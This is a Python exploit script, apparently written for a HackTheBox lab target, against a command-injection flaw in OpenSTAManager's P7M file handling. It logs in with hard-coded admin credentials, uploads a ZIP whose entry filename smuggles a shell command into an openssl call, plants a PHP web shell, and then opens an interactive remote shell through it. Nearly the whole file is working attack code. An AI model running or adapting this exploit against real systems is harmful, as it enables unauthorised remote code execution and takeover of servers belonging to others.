#!/usr/bin/env python3
"""
CVE-2025-69212 - OpenSTAManager OS Command Injection via P7M filename
HTB Enigma challenge
"""

import zipfile
import requests
import sys
import io

TARGET = "http://support_001.enigma.htb"
USERNAME = "admin"
PASSWORD = "Ne3s4rtars78s"

SESSION = requests.Session()

def login():
    print("[*] Logging in...")
    r = SESSION.post(f"{TARGET}/index.php", data={
        "username": USERNAME,
        "password": PASSWORD,
        "login": "1"
    }, allow_redirects=True)
    if "logout" in r.text.lower() or r.status_code == 200:
        print("[+] Logged in")
        return True
    print("[-] Login failed")
    return False

def make_malicious_zip(cmd="id"):
    """
    Filename breaks out of exec() double quotes:
    exec('openssl ... -in "invoice.p7m";CMD;echo ".p7m"')
    """
    # Drop a webshell into files/
    shell_cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
    malicious_filename = f'invoice.p7m";{shell_cmd};echo ".p7m'
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
    buf.seek(0)
    return buf

def upload_zip(zip_buf):
    print("[*] Uploading malicious ZIP...")
    files = {
        "blob1": ("exploit.zip", zip_buf, "application/zip")
    }
    data = {
        "op": "save",
        "id_module": "14",
        "id_plugin": "48"
    }
    r = SESSION.post(f"{TARGET}/actions.php", files=files, data=data)
    # 500 is expected — command runs before XML parsing fails
    if r.status_code in [200, 500]:
        print(f"[+] Upload done (status {r.status_code}) — shell should be planted")
    else:
        print(f"[-] Unexpected status: {r.status_code}")

def check_shell():
    print("[*] Checking webshell...")
    r = SESSION.get(f"{TARGET}/files/SHELL.php?c=id", timeout=5)
    if "uid=" in r.text:
        print(f"[+] RCE confirmed: {r.text.strip()}")
        return True
    print("[-] Shell not found yet")
    return False

def rce(cmd):
    r = SESSION.get(f"{TARGET}/files/SHELL.php", params={"c": cmd}, timeout=10)
    return r.text.strip()

def interactive_shell():
    print("\n[+] Dropping into interactive shell (type 'exit' to quit)")
    print("[!] Avoid '/' in commands — use 'cd dir && cmd' instead\n")
    while True:
        cmd = input("$ ").strip()
        if cmd.lower() == "exit":
            break
        if not cmd:
            continue
        print(rce(cmd))

if __name__ == "__main__":
    if not login():
        sys.exit(1)
    
    zip_buf = make_malicious_zip()
    upload_zip(zip_buf)
    
    if check_shell():
        interactive_shell()
    else:
        print("[-] Try uploading again or check the files/ path")
